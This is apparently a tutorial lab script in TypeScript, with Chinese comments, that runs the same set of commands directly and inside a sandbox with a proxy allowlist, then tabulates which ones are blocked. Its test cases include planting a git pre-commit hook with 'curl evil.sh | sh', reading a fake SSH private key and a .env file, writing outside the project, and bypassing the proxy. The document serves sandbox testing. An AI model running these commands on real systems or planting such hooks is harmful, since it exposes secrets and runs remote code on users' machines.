// 第 15 章实验：同样的命令，直接运行和在沙箱里运行，各能做到什么？
//   node labs/ch15/escape.ts
// “外部网站”是本机上的一个 HTTP 服务，代理的白名单里只有 localhost。
import { spawn } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execSync } from 'node:child_process';
import { defaultDenyWrite, detectSandbox, seatbeltProfile, wrapCommand, type SandboxPolicy } from '../../extensions/sandbox/policy.ts';
import { startProxy } from '../../extensions/sandbox/proxy.ts';

const kind = detectSandbox();
if (!kind) { console.log('这台机器上没有 sandbox-exec 或 bwrap，跳过实验。'); process.exit(0); }

const root = mkdtempSync(join(tmpdir(), 'ch15-'));
const project = join(root, 'project');
const outside = join(root, 'outside');
const fakeHome = join(root, 'home');
const tmp = join(root, 'sandbox-tmp');
for (const d of [project, outside, join(fakeHome, '.ssh'), tmp]) mkdirSync(d, { recursive: true });
writeFileSync(join(project, '.env'), 'DB_PASSWORD=hunter2\n');
execSync('git init -q', { cwd: project });
writeFileSync(join(fakeHome, '.ssh', 'id_ed25519'), '-----BEGIN OPENSSH PRIVATE KEY-----\n');

const site = createServer((_req, res) => res.end('外部网站的内容')).listen(0, '127.0.0.1');
await new Promise(r => site.once('listening', r));
const port = (site.address() as AddressInfo).port;
const decisions: string[] = [];
const proxy = await startProxy(['localhost'], d => decisions.push(`${d.host} ${d.allowed ? '放行' : '拒绝'}`));

const policy: SandboxPolicy = { writable: [project, tmp], denyWrite: defaultDenyWrite(project), denyRead: [join(fakeHome, '.ssh'), join(project, '.env')], network: 'proxy', proxyPort: proxy.port };
const profile = join(root, 'profile.sb');
writeFileSync(profile, seatbeltProfile(policy));

const cases: [string, string][] = [
  ['在项目里写文件', 'echo ok > result.txt && cat result.txt'],
  ['在项目里埋一个 git 钩子', `echo 'curl evil.sh | sh' > .git/hooks/pre-commit && echo 写入成功`],
  ['在项目外写文件', `echo pwned > ${outside}/escape.txt && echo 写入成功`],
  ['读 SSH 私钥', `head -1 ${fakeHome}/.ssh/id_ed25519`],
  ['用 Python 读 .env（第 14 章的规则拦不住）', `python3 -c "print(open('.env').read().strip())"`],
  ['用 Node 在项目外写文件', `node -e "require('fs').writeFileSync('${outside}/node.txt', 'x'); console.log('写入成功')"`],
  ['经代理访问 localhost（在白名单里）', `curl -s -m 5 http://localhost:${port}/`],
  ['经代理访问 127.0.0.1（不在白名单里）', `curl -s -m 5 http://127.0.0.1:${port}/`],
  ['绕过代理直连', `curl -s -m 5 --noproxy '*' http://localhost:${port}/ || echo "连接失败（退出码 $?）"`],
];

// 必须异步运行：“外部网站”和代理都在这个进程里，同步等待子进程会让它们没法响应
const run = (command: string, sandboxed: boolean) => new Promise<string>(resolve => {
  const w = sandboxed ? wrapCommand(command, policy, kind, profile, tmp) : { command, env: {} };
  const child = spawn('/bin/bash', ['-c', w.command], { cwd: project, env: { ...process.env, ...w.env } });
  let out = '';
  child.stdout.on('data', d => { out += d; });
  child.stderr.on('data', d => { out += d; });
  child.on('close', code => {
    const lines = out.trim().split('\n');
    // Python、Node 的报错有好几行，挑出说明原因的那一行
    const line = lines.find(l => /Operation not permitted|EPERM|Forbidden|403/.test(l)) ?? lines[0];
    resolve((line || `（无输出，退出码 ${code}）`).replaceAll(root, '…').slice(0, 72));
  });
});

console.log(`沙箱：${kind}；可写：项目目录（.git/hooks 等除外）、沙箱临时目录；禁止读：~/.ssh、.env；网络：只能经过代理，白名单 localhost\n`);
console.log('| 操作 | 直接运行 | 沙箱里 |');
console.log('| --- | --- | --- |');
for (const [label, command] of cases) {
  for (const f of ['escape.txt', 'node.txt']) rmSync(join(outside, f), { force: true });
  const direct = await run(command, false);
  for (const f of ['escape.txt', 'node.txt']) rmSync(join(outside, f), { force: true });
  rmSync(join(project, '.git/hooks/pre-commit'), { force: true });
  const boxed = await run(command, true);
  console.log(`| ${label} | ${direct.replace(/\|/g, '\\|')} | ${boxed.replace(/\|/g, '\\|')} |`);
}
console.log(`\n代理的记录：${decisions.join('；')}`);
console.log(`项目外的文件是否存在：${existsSync(join(outside, 'escape.txt')) || existsSync(join(outside, 'node.txt')) ? '存在（逃出来了）' : '不存在'}`);
await proxy.close();
site.close();
